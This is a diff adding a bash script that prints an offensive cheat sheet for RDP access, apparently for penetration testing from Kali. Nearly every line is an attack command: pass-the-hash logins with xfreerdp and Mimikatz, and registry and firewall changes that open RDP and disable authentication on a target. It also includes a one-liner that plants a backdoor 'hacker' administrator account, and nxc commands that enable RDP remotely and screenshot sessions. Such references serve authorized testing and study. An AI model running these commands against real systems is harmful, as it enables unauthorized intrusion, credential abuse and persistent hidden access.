@@ -1,0 +1,54 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── RDP / XFREERDP ────────────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── xfreerdp (Kali) ──────────────────────────────────${NC}"
+echo -e "  ${GREEN}xfreerdp /u:<USER> /p:<PASS> /v:<IP>${NC}             # basic connect"
+echo -e "  ${GREEN}xfreerdp /u:<USER> /pth:<NTLM> /v:<IP> /cert-ignore${NC}  # PTH"
+echo -e "  ${GREEN}xfreerdp /u:<USER> /p:<PASS> /v:<IP> /drive:share,/home/kali/share${NC}  # shared folder"
+echo -e "  ${GREEN}xfreerdp /cert-ignore /compression /auto-reconnect /u:<USER> /p:<PASS> /v:<IP>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Enable RDP on Target ─────────────────────────────${NC}"
+echo -e "  ${GREEN}reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f${NC}"
+echo -e "  ${GREEN}netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes${NC}"
+echo -e "  ${GREEN}reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f${NC}"
+printf "\n"
+echo -e "  Note: Via nxc (remote):"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M rdp -o ACTION=enable${NC}"
+echo -e "  ${GREEN}nxc rdp <TARGET> -u <USER> -p <PASS> --nla-screenshot${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Add User + Enable RDP (one-liner) ────────────────${NC}"
+echo -e "  ${GREEN}net user hacker P@ss123! /add && net localgroup administrators hacker /add && net localgroup \"Remote Desktop Users\" hacker /add && reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── RDP Pass-the-Hash (Restricted Admin Mode) ────────${NC}"
+echo -e "  Note: Enable RestrictedAdmin on target (requires current admin access):"
+echo -e "  ${GREEN}reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0${NC}"
+printf "\n"
+echo -e "  Note: Then xfreerdp PTH:"
+echo -e "  ${GREEN}xfreerdp /u:<USER> /pth:<NTLM> /v:<IP> /cert-ignore${NC}"
+printf "\n"
+echo -e "  Note: Or Mimikatz:"
+echo -e "  ${GREEN}sekurlsa::pth /user:admin /domain:corp1 /ntlm:<HASH> /run:\"mstsc.exe /restrictedadmin\"${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── rdesktop (old fallback) ──────────────────────────${NC}"
+echo -e "  ${GREEN}rdesktop -u <USER> -p <PASS> <IP>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Screenshot via nxc (no GUI) ──────────────────────${NC}"
+echo -e "  ${GREEN}nxc rdp <TARGET> -u <USER> -p <PASS> --screenshot --screentime 5${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
